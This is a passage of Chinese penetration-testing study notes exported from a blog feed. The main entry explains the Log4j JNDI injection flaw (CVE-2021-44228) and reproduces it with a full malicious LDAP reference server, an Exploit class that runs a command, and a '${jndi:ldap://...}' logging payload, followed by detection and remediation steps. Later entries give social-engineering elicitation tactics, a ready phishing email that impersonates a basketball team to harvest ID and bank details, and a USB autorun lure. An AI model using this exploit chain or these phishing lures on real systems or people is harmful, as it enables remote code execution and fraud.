        <content type="html"><![CDATA[<h1 id="Log4j介绍与漏洞影响"><a href="#Log4j介绍与漏洞影响" class="headerlink" title="Log4j介绍与漏洞影响"></a>Log4j介绍与漏洞影响</h1><h2 id="什么是Log4j"><a href="#什么是Log4j" class="headerlink" title="什么是Log4j"></a>什么是Log4j</h2><p>Apache的开源日志组件 </p><h2 id="记录日志的作用"><a href="#记录日志的作用" class="headerlink" title="记录日志的作用"></a>记录日志的作用</h2><ol><li>1、可以对程序的运行进行调试跟踪 </li><li>2、对业务操作进行记录，方便追溯</li></ol><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ol><li>1、pom引入依赖 </li><li>2、获得logger实例 </li><li>3、logger.info() <ul><li>logger.debug() </li><li>logger.error() </li><li>logger.warn()</li></ul></li></ol><h2 id="为什么要用log4j"><a href="#为什么要用log4j" class="headerlink" title="为什么要用log4j"></a>为什么要用log4j</h2><p>调整日志级别和修改配置 </p><ul><li>日志级别管理，比如生产环境只打印info日志， 不打印debug日志 </li><li>不同的package，打印格式不同 </li><li>多输出渠道 <ul><li>控制台 </li><li>文件 </li><li>数据库</li></ul></li><li>日志文件管理 <ul><li>文件大小 </li><li>定时自动清理</li></ul></li><li>易于集成 <ul><li>Spring </li><li>Spring Boot</li></ul></li></ul><h2 id="log4j漏洞时间线"><a href="#log4j漏洞时间线" class="headerlink" title="log4j漏洞时间线"></a>log4j漏洞时间线</h2><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228</a> </p><ol><li>1、11月24日，阿里云安全团队陈兆军报告log4j RCE漏洞 </li><li>2、12月4日开始有在野攻击 </li><li>3、10号凌晨漏洞细节被公开 </li><li>4、各SRC陆续关闭log4j漏洞提交通道 </li><li>5、各安全厂商纷纷通报，发布临时解决办法 </li><li>7、Apache陆续发布rc1补丁、rc2补丁、2.15正 式版</li></ol><h2 id="受影响公司"><a href="#受影响公司" class="headerlink" title="受影响公司"></a>受影响公司</h2><p>绝大部分互联网公司</p><h1 id="什么是LDAP"><a href="#什么是LDAP" class="headerlink" title="什么是LDAP"></a>什么是LDAP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>LIGHTWEIGHT DIRECTORY ACCESS Protocol </p><p>轻量级目录访问协议 </p><h3 id="简称"><a href="#简称" class="headerlink" title="简称"></a>简称</h3><p>目录服务 </p><h3 id="目录服务（例子）"><a href="#目录服务（例子）" class="headerlink" title="目录服务（例子）"></a>目录服务（例子）</h3><p>小镇的电话簿 </p><p>马云中国黄页 </p><h2 id="计算机如何提供目录服务？"><a href="#计算机如何提供目录服务？" class="headerlink" title="计算机如何提供目录服务？"></a>计算机如何提供目录服务？</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>目录数据库</p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>统一登录</p><ul><li>OA系统 </li><li>邮箱服务器</li><li>Git服务器 </li><li>VPN</li></ul><h2 id="厂商实现"><a href="#厂商实现" class="headerlink" title="厂商实现"></a>厂商实现</h2><h3 id="SUN"><a href="#SUN" class="headerlink" title="SUN"></a>SUN</h3><p>SUNONE Directory Server </p><h3 id="IBM"><a href="#IBM" class="headerlink" title="IBM"></a>IBM</h3><p>IBM Directory Server </p><h3 id="Novell"><a href="#Novell" class="headerlink" title="Novell"></a>Novell</h3><p>Novell Directory Server </p><h3 id="Microsoft"><a href="#Microsoft" class="headerlink" title="Microsoft"></a>Microsoft</h3><p>Microsoft Active Directory </p><h3 id="Opensource"><a href="#Opensource" class="headerlink" title="Opensource"></a>Opensource</h3><p>Opensource </p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>查询、添加、修改、删除 </p><h2 id="Java代码演示"><a href="#Java代码演示" class="headerlink" title="Java代码演示"></a>Java代码演示</h2><h3 id="LDAPSeriServer"><a href="#LDAPSeriServer" class="headerlink" title="LDAPSeriServer"></a>LDAPSeriServer</h3><ul><li>UnboundID依赖 </li><li>监听7389 </li><li>添加了一条数据</li></ul><h2 id="LDAPClient"><a href="#LDAPClient" class="headerlink" title="LDAPClient"></a>LDAPClient</h2><ul><li>Context对象 </li><li>lookup方法查找数据</li></ul><h1 id="什么是JNDI？"><a href="#什么是JNDI？" class="headerlink" title="什么是JNDI？"></a>什么是JNDI？</h1><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>Java Naming and Directory Interface Java </p><p>命名和目录接口 </p><h2 id="简称-1"><a href="#简称-1" class="headerlink" title="简称"></a>简称</h2><p>命名服务 </p><h2 id="JDBC的不足"><a href="#JDBC的不足" class="headerlink" title="JDBC的不足"></a>JDBC的不足</h2><p>不便于维护 </p><h2 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h2><ol><li>1、先去公布资源 <code>bind</code>方法 </li><li>2、然后别人可以用名字查找资源 <code>lookup</code>方法</li></ol><h2 id="改造JDBC"><a href="#改造JDBC" class="headerlink" title="改造JDBC"></a>改造JDBC</h2><pre class="line-numbers language-none"><code class="language-none">Object datasourceRef=ctx.lookup("java:jdbc/mydatasource"); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h2><p>spring.datasource.jndi-name=jdbc/ exampleDB </p><h2 id="JNDI的作用"><a href="#JNDI的作用" class="headerlink" title="JNDI的作用"></a>JNDI的作用</h2><p><img src="assets/image-20230420174414403.png" alt="image-20230420174414403"></p><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p>用JNDI接口访问LDAP服务，或者RMI（远程方法调用服务） </p><h2 id="代码演示："><a href="#代码演示：" class="headerlink" title="代码演示："></a>代码演示：</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>LDAPSeriServer.java </p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>JNDIClient.java </p><p>关键函数 <code>lookup</code></p><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h2 id="1、JNDI动态协议转换"><a href="#1、JNDI动态协议转换" class="headerlink" title="1、JNDI动态协议转换"></a>1、JNDI动态协议转换</h2><ul><li>即使初始化的Context指定了一个协议，也会根 据URI传入的参数来转换协议 </li><li>比如：Context初始化是RMI服务，但是lookup 的参数是LDAP服务，这个时候协议会动态转 换。</li></ul><h2 id="2、Naming-Reference-命名引用"><a href="#2、Naming-Reference-命名引用" class="headerlink" title="2、Naming Reference 命名引用"></a>2、Naming Reference 命名引用</h2><ul><li>不在命名/目录服务本地的一个资源，叫做命名引用 </li><li>让JNDI去请求一个不存在的资源 </li><li>当JNDI客户端在本地classpath找不到这个类， 就去指定的远程地址请求，下载这个类到本地执 行</li></ul><p>例如 Exploit 定义静态方法块 </p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="assets/image-20230420174848739.png" alt="image-20230420174848739"></p><h2 id="为什么会执行远程代码？"><a href="#为什么会执行远程代码？" class="headerlink" title="为什么会执行远程代码？"></a>为什么会执行远程代码？</h2><h3 id="NamingManager-341行"><a href="#NamingManager-341行" class="headerlink" title="NamingManager 341行"></a>NamingManager 341行</h3><p><img src="assets/image-20230420174816341.png" alt="image-20230420174816341"></p><h3 id="getObjectFactoryFrom…"><a href="#getObjectFactoryFrom…" class="headerlink" title="getObjectFactoryFrom…"></a>getObjectFactoryFrom…</h3><p><img src="assets/image-20230420174909664.png" alt="image-20230420174909664"></p><h2 id="RMI资源也可以这样利用，原理一样"><a href="#RMI资源也可以这样利用，原理一样" class="headerlink" title="RMI资源也可以这样利用，原理一样"></a>RMI资源也可以这样利用，原理一样</h2><h3 id="1、怎么在外网启动一个LDAP服务？"><a href="#1、怎么在外网启动一个LDAP服务？" class="headerlink" title="1、怎么在外网启动一个LDAP服务？"></a>1、怎么在外网启动一个LDAP服务？</h3><p>除了本地Java代码，也可以用marshalsec-0.0. 3-SNAPSHOT-all.jar，带参数直接启动 </p><h3 id="2、怎么在外网启动一个HTTP服务？"><a href="#2、怎么在外网启动一个HTTP服务？" class="headerlink" title="2、怎么在外网启动一个HTTP服务？"></a>2、怎么在外网启动一个HTTP服务？</h3><p> Apache、Tomcat、Nginx、Phpstudy……</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><h3 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h3><p>IDEA </p><h3 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h3><p>JDK 1.8u121以下的版本 </p><p><code>java -version</code> </p><h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><p>下载地址：<a href="https://dlcdn.apache.org/maven/maven-3/">https://dlcdn.apache.org/maven/maven-3/</a></p><p>例如apache-maven-3.6.3-bin</p><p><code>mvn -version</code> </p><h2 id="1、准备远程代码"><a href="#1、准备远程代码" class="headerlink" title="1、准备远程代码"></a>1、准备远程代码</h2><h3 id="Exploit-java"><a href="#Exploit-java" class="headerlink" title="Exploit.java"></a>Exploit.java</h3><pre class="line-numbers language-none"><code class="language-none">import java.io.IOException;public class Exploit {    static {        try {            // 打开windows电脑的计算器 proof of content            Runtime.getRuntime().exec("calc");        } catch (IOException e) {            e.printStackTrace();        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Exploit-class"><a href="#Exploit-class" class="headerlink" title="Exploit.class"></a>Exploit.class</h3><p><code>javac Exploit.java</code></p><pre class="line-numbers language-none"><code class="language-none">//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//import java.io.IOException;public class Exploit {    public Exploit() {    }    static {        try {            Runtime.getRuntime().exec("calc");        } catch (IOException var1) {            var1.printStackTrace();        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="上传到HTTP服务器"><a href="#上传到HTTP服务器" class="headerlink" title="上传到HTTP服务器"></a>上传到HTTP服务器</h3><ul><li>Apache、Python SimpleHTTPServer都可以 </li><li>phpstudy <ul><li>Windows </li><li>Linux</li></ul></li></ul><h2 id="2、准备LDAP服务器"><a href="#2、准备LDAP服务器" class="headerlink" title="2、准备LDAP服务器"></a>2、准备LDAP服务器</h2><pre class="line-numbers language-none"><code class="language-none">import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;public class LDAPRefServer {    private static final String LDAP_BASE = "dc=example,dc=com";    /**     * class地址 用#Exploit代替Exploit.class     */    private static final String EXPLOIT_CLASS_URL = "http://192.168.70.13:80/#Exploit";    public static void main(String[] args) {        int port = 7912;        try {            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);            config.setListenerConfigs(new InMemoryListenerConfig(                    "listen",                    InetAddress.getByName("0.0.0.0"),                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL)));            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);            System.out.println("Listening on 0.0.0.0:" + port);            ds.startListening();        } catch (Exception e) {            e.printStackTrace();        }    }    private static class OperationInterceptor extends InMemoryOperationInterceptor {        private URL codebase;        public OperationInterceptor(URL cb) {            this.codebase = cb;        }        @Override        public void processSearchResult(InMemoryInterceptedSearchResult result) {            String base = result.getRequest().getBaseDN();            Entry e = new Entry(base);            try {                sendResult(result, base, e);            } catch (Exception e1) {                e1.printStackTrace();            }        }        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);            e.addAttribute("javaClassName", "Calc");            String cbstring = this.codebase.toString();            int refPos = cbstring.indexOf('#');            if (refPos &gt; 0) {                cbstring = cbstring.substring(0, refPos);            }            e.addAttribute("javaCodeBase", cbstring);            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$            e.addAttribute("javaFactory", this.codebase.getRef());            result.sendSearchEntry(e);            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>LDAPRefServer.java <ul><li>maven依赖 </li><li>unboundid-ldapsdk</li></ul></li><li>配置远程代码的HTTP URL </li><li>启动服务，绑定指定端口</li></ul><h2 id="3、LDAP客户端（log4j）"><a href="#3、LDAP客户端（log4j）" class="headerlink" title="3、LDAP客户端（log4j）"></a>3、LDAP客户端（log4j）</h2><pre class="line-numbers language-none"><code class="language-none">import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class Log4J {    private static final Logger logger = LogManager.getLogger(Log4J.class);    public static void main(String[] args) {        // 先启动LDAP服务器        logger.error("${jndi:ldap://127.0.0.1:7912/test}");        // logger.error("${java:runtime} - ${java:vm} - ${java:os}");    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>maven依赖 <ul><li>2.14.1</li></ul></li><li>版本 <ul><li>Apache Log4j 2.x &lt;= 2.14.1</li></ul></li><li>打印日志即可，客户端即下载恶意代码并执行</li></ul><p><img src="assets/image-20230420180212915.png" alt="image-20230420180212915"></p><h1 id="log4j-RCE原理分析"><a href="#log4j-RCE原理分析" class="headerlink" title="log4j RCE原理分析"></a>log4j RCE原理分析</h1><ul><li>log4j支持<code>JNDI lookup</code>功能 StrSubstitutor resolveVariable()</li><li><code>NamingManager newInstance</code></li><li>为什么要打开计算器 任意命令</li><li>前端注入点 只要是参数被log4j记录的地方都可以</li><li>现成利用工具 log4j_POC.ja</li></ul><h1 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h1><ul><li>log4j 2.x &lt;= 2.14.1 </li><li>JDK 小于 8u191、7u201、6u211</li></ul><h1 id="漏洞排查"><a href="#漏洞排查" class="headerlink" title="漏洞排查"></a>漏洞排查</h1><h3 id="pom版本检查"><a href="#pom版本检查" class="headerlink" title="pom版本检查"></a>pom版本检查</h3><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><ul><li>是否存在“jndi:ldap://”、“jndi:rmi” “dnslog. cn” “ceye.io”等 </li><li>是否存在JndiLookup、ldapURLContext、 getObjectFactoryFromReference调用</li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li><a href="https://static.threatbook.cn/tools/log4jlocal-check.sh">https://static.threatbook.cn/tools/log4jlocal-check.sh</a> </li><li><a href="https://sca.seczone.cn/allScanner.zip">https://sca.seczone.cn/allScanner.zip</a></li></ul><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>1、禁止用户请求参数出现攻击关键字 安全产品 </li><li>2、禁止lookup下载远程文件（命名引用） </li><li>3、禁止log4j的应用连接外网 </li><li>4、禁止log4j使用lookup </li><li>5、从log4j jar包中中删除lookup 2.10以下</li></ol><h2 id="升级到2-17-1"><a href="#升级到2-17-1" class="headerlink" title="升级到2.17.1"></a>升级到2.17.1</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol><li>1、默认不再支持二次跳转（也就是命名引用）的 方式获取对象 </li><li>2、只有在log4j2.allowedLdapClasses列表中指 定的class才能获取。 </li><li>3、只有远程地址是本地地址或者在log4j2. allowedLdapHosts列表中指定的地址才能获取</li></ol><h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><h3 id="升级JDK"><a href="#升级JDK" class="headerlink" title="升级JDK"></a>升级JDK</h3><ul><li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为 true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前 JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客 户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全 性。 </li><li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object. trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程 codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏 洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object. trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选 项，把LDAP协议的攻击途径也给禁了。</li></ul><h3 id="修改log4j配置"><a href="#修改log4j配置" class="headerlink" title="修改log4j配置"></a>修改log4j配置</h3><ol><li>1、设置参数 <code>log4j2.formatMsgNoLookups=True</code> </li><li>2、修改JVM参数 -<code>Dlog4j2.formatMsgNoLookups=true</code> </li><li>3、系统环境变量 <code>FORMAT_MESSAGES_PATTERN_DISABLE_ LOOKUPS</code>设置为<code>true</code> </li><li>4、禁止 log4j2 所在服务器外连</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/31-she-hui-gong-cheng-xue/di-4-zhang-she-hui-gong-cheng-xue-4/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/31-she-hui-gong-cheng-xue/di-4-zhang-she-hui-gong-cheng-xue-4/</url>
      
        <content type="html"><![CDATA[<h1 id="交流模型"><a href="#交流模型" class="headerlink" title="交流模型"></a>交流模型</h1><h1 id="社工案例"><a href="#社工案例" class="headerlink" title="社工案例"></a>社工案例</h1><h1 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h1><pre class="line-numbers language-none"><code class="language-none">不战而屈人之兵，善之善者也 有效地引导别人将他心理的话说出来，是社会工程成功的一个关键要素。 【例如】去了别人家里想要获取WIFI密码？你敲门 说家里网坏了，孩子要上网课，问一下邻居家 的WIFI密码。 【例如】去了一家公司面试？需要问前台告诉你密码 在人们见到你并跟你进行交流，让别人感觉到你很自在，很放松，跟你聊天很舒服。自来熟！! 相见恨晚，一见如故。消除别人和你之间的距离，降低他的防备心理。目的是让交流着能够吐露 心声！ 比如包装 一些归国富豪(成功人士)眼前一亮 给人一种特殊的感觉！比如 穿着得体 笑起来真好 看？对某些人 有这样的感觉，那么给你这样感觉的人就适合去做社会工程师。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="能力"><a href="#能力" class="headerlink" title="能力"></a>能力</h1><pre class="line-numbers language-none"><code class="language-none">通过训练，让你成为类似这样有潜在的能力的人！！！人情世故！！高情商的一种表现。经常间谍、骗子、刑侦、审讯、社工人员常用的一个非常强大的工具。医生、护士、治疗师、司法人员等这些人，在社会中都普遍的使用诱导这一个工具。仅仅通过一项技巧就能获取你要的信息，是社会工程学中，几个重要的强有力的工具之一。从社会工程学角度来分析，熟练的运用该工具，能够改变别人对你看法，还能够改变在你安全时间中的工作方式。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="诱导的含义"><a href="#诱导的含义" class="headerlink" title="诱导的含义"></a>诱导的含义</h1><pre class="line-numbers language-none"><code class="language-none">诱导的含义就是引出、套出或者得出一个逻辑上的结论。(某种事实)，或者可以讲诱导定义为一 种引发或诱发某种特定类型行为的刺激。 这个技能是全球特工都必会的一个技能，政府工作人员，或者说一些重点的单位，都要做抗诱的 培训。给出警告 警示 以对抗诱导。 在美国国家安全局的培训资料中，定义就是说在貌似平常、平凡的对话中精妙的获取信息。 这样的对话可以发生在任何地方、学校、餐馆、健身房、托儿所。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="交谈步骤"><a href="#交谈步骤" class="headerlink" title="交谈步骤"></a>交谈步骤</h1><ol><li>表现的自然 </li><li>拥有足够的知识 </li><li>切忌贪婪</li></ol><h1 id="成功诱导"><a href="#成功诱导" class="headerlink" title="成功诱导"></a>成功诱导</h1><ol><li>不要惧怕和别人沟通、交谈。 </li><li>真心的关心他人，即便是个陌生人 </li><li>只有在真正有了解决方案的时候才给别人靠谱的建议或帮助 </li><li>在他人说出自己的问题的时候，不要做主观的判断。</li></ol><h1 id="诱导技巧"><a href="#诱导技巧" class="headerlink" title="诱导技巧"></a>诱导技巧</h1><ol><li>唤醒别人的自我，比如 攻击者说你的工作一定很重要,xxx也认为你比较厉害。 </li><li>表达共同的兴趣、爱好、价值观。 </li><li>故意说错 </li><li>主动提供信息</li><li>假装很高深 </li><li>利用酒精的影响</li></ol><h1 id="提问艺术"><a href="#提问艺术" class="headerlink" title="提问艺术"></a>提问艺术</h1><ol><li>开放式问题 </li><li>封闭式问题 </li><li>引导性问题 </li><li>假设性问题</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/31-she-hui-gong-cheng-xue/di-3-zhang-she-hui-gong-cheng-xue-3/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/31-she-hui-gong-cheng-xue/di-3-zhang-she-hui-gong-cheng-xue-3/</url>
      
        <content type="html"><![CDATA[<h1 id="【钓鱼邮件案例】"><a href="#【钓鱼邮件案例】" class="headerlink" title="【钓鱼邮件案例】"></a>【钓鱼邮件案例】</h1><h2 id="【交流模型】"><a href="#【交流模型】" class="headerlink" title="【交流模型】"></a>【交流模型】</h2><ul><li>聊天 </li><li>垃圾 优秀教师申报 </li><li>面试 面试者 故意弄脏 借电脑打印 </li><li>爱好 喜欢看球赛 </li><li>彩票 喜欢看球赛 </li><li>财务 合理避税 发票 </li><li>黑产 电信诈骗 -银行卡 -银行卡 身份证 USBKEY </li><li>微信 朋友圈 公众号 微信群</li></ul><h2 id="【编写邮件】"><a href="#【编写邮件】" class="headerlink" title="【编写邮件】"></a>【编写邮件】</h2><h3 id="目标人物"><a href="#目标人物" class="headerlink" title="目标人物"></a>目标人物</h3><p>接收方 特征 男性 篮球 NBA CBA</p><h3 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h3><p>伪造一个 NBA 某一队 湖人队，发一封邮件给接收方，邀请他参加 NBA 湖人队的比 赛。要求你填写个人信息，获得你的机票、比赛的票。 </p><p>收集 -姓名 身份证号 身份证照片 银行卡号 手机号 Cookie 其他 </p><p>Web安全 渗透技术 木马免 杀等技术综合使用</p><h3 id="构建邮件"><a href="#构建邮件" class="headerlink" title="构建邮件"></a>构建邮件</h3><h4 id="申请邮箱"><a href="#申请邮箱" class="headerlink" title="申请邮箱"></a>申请邮箱</h4><p>QQ邮箱/163常见的邮箱 </p><h4 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h4><ul><li>liyanliang </li><li>lyl </li><li>li_yan_liang </li><li>liyanliang2021</li></ul><h4 id="邮件内容"><a href="#邮件内容" class="headerlink" title="邮件内容"></a>邮件内容</h4><pre class="line-numbers language-none"><code class="language-none">你好！ 这是来自 “美国 湖人队 我的梦幻篮球计划”面向全球召集球迷的好消息，恭喜你！ 李先 生,我们荣幸的邀请您参加我们的活动。为了能够更好的提升您的用户体验，请尽快到我们邮件下 方指定的链接完善您的个人信息，获取往返机票以及比赛门票。我们很高兴的告诉您，您务必尽 快登陆，此链接24小时有效，前100名享受 "科比"亲自签名限量版(库存)的球衣。xxxxx 此处省 略800字。网址：www.nishidashazi.com 1对1 反馈 美国人 看邮件 不反馈 中国人 钉钉 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">你好！ 这是来自 “美国 湖人队 我的梦幻篮球计划”面向全球召集球迷的好消息，恭喜你！ 我们荣 幸的邀请您参加我们的活动。为了能够更好的提升您的用户体验，请尽快到我们邮件下方指定的 链接完善您的个人信息，获取往返机票以及比赛门票。我们很高兴的告诉您，您务必尽快登陆， 此链接24小时有效，前100名享受 "科比"亲自签名限量版(库存)的球衣。xxxxx 此处省略800 字。网址：www.nishidashazi.com 1对N 群发 100人 反馈20人<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="钓鱼网址"><a href="#钓鱼网址" class="headerlink" title="钓鱼网址"></a>钓鱼网址</h4><ul><li>Web开发的能力 </li><li>Web挂马XSS</li></ul><p>网站 -收集</p><h1 id="【USB存储-物理渗透】"><a href="#【USB存储-物理渗透】" class="headerlink" title="【USB存储 物理渗透】"></a>【USB存储 物理渗透】</h1><h2 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h2><pre class="line-numbers language-none"><code class="language-none">通过现场进行社会工程学比较困难，利用人性的漏洞。同情心！！！难就难在是面对面的。当 着 目标的面。心理素质好！演技要好！比如紧张忽略细节 或所有的这过程。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">平时在工作中经常会用到U盘进行数据交换！ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">真实案例 比如你去一家公司面试，HR 简历，咖啡 水 等液体故意弄湿你的文件，简历。作为社 工人员你就是信息源，信道 这里信道就是口头交流、运用声音、演技（面部表情）慌张、肢体 语言。弄湿文件道具，让你的故事更逼真。前台 或 HR 表现您很无助，很沮丧、很焦急寻求帮 助。但是说话的过程要非常的礼貌且要真诚，以真诚的表现，博得同情心、好感。U盘中有要能 打印电子版 Word PDF 文件.exe 捆绑！！离家远 回去一趟来不及，对公司也不熟悉，外边找 不到打印的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">插入U盘 免杀 自动动执行 自启动的内容 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/31-she-hui-gong-cheng-xue/di-2-zhang-she-hui-gong-cheng-xue-2/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/31-she-hui-gong-cheng-xue/di-2-zhang-she-hui-gong-cheng-xue-2/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h1 id="交流模型"><a href="#交流模型" class="headerlink" title="交流模型"></a>交流模型</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>我们的制定的交流模型越简单、精巧、越清晰，花在交流的时间上就越少。</p><h2 id="实质"><a href="#实质" class="headerlink" title="实质"></a>实质</h2><p>交流是将信息从一个实体传送到另一个实体的过程。</p><p>充分必要的条件 -交流至少要二 者以上的互动一双向的互动</p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><ol><li>发生了信息的交换</li><li>思维的碰撞</li><li>情感的互动</li><li>想法上共识 -社工人员、被渗透目标</li></ol><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="发送者"><a href="#发送者" class="headerlink" title="发送者"></a>发送者</h3><p>信息经过打包一传输介质/媒介一加密</p><h3 id="接收者"><a href="#接收者" class="headerlink" title="接收者"></a>接收者</h3><p>接收经过打包一 解密——反馈——回复/不回复</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li><p>发送者</p></li><li><p>接收者</p></li><li><p>信息内容</p></li></ul><h2 id="方式"><a href="#方式" class="headerlink" 